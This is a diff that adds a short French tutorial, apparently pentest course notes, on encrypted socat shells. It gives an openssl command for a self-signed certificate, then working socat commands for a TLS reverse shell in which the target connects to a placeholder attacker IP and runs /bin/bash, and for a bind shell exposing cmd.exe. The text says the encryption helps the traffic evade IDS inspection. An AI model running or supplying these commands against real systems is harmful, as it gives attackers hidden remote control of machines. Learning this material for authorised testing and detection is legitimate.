@@ -1,1 +1,39 @@
-comment crée un reverseshell socat en 
+Shells chiffrés avec Socat
+L’un des avantages majeurs de socat est sa capacité à établir des connexions chiffrées, que ce soit en mode bind ou reverse shell. Ce chiffrement permet de sécuriser les échanges réseau : un IDS aura plus de mal à inspecter ou détecter ce type de trafic sans accès à la clé. C’est particulièrement utile dans des contextes où la discrétion est importante.
+
+Rappel sur les shells simples
+Les shells de base ont déjà été abordés précédemment, donc la syntaxe ne sera pas détaillée ici. Il faut simplement retenir que lorsque la commande contient TCP, celle-ci doit être remplacée par OPENSSL pour activer le chiffrement via TLS.
+
+Génération du certificat
+Pour mettre en place un shell chiffré, il faut d’abord générer un certificat SSL. Cela peut se faire facilement avec OpenSSL, sur la machine qui hébergera l’écouteur :
+
+command:
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+Cette commande génère une paire clé/certificat auto-signée, valide pendant presque un an. Les informations demandées peuvent être laissées vides ou remplies arbitrairement.
+
+Ensuite, il faut fusionner les deux fichiers pour obtenir un fichier .pem :
+
+
+cat shell.key shell.crt > shell.pem
+Exemple de shell inversé chiffré
+Sur la machine qui écoute (souvent l’attaquant) :
+
+
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+verify=0 permet de désactiver la vérification du certificat par une autorité reconnue.
+
+Sur la machine cible (qui se connecte) :
+
+socat OPENSSL:<IP-ATTAQUANT>:<PORT>,verify=0 EXEC:/bin/bash
+
+Exemple de shell bind chiffré
+
+Sur la cible (qui écoute) :
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+Sur l’attaquant (qui se connecte) :
+socat OPENSSL:<IP-CIBLE>:<PORT>,verify=0 -
+
+Le certificat .pem doit impérativement être placé sur la machine qui écoute la connexion.
+
+
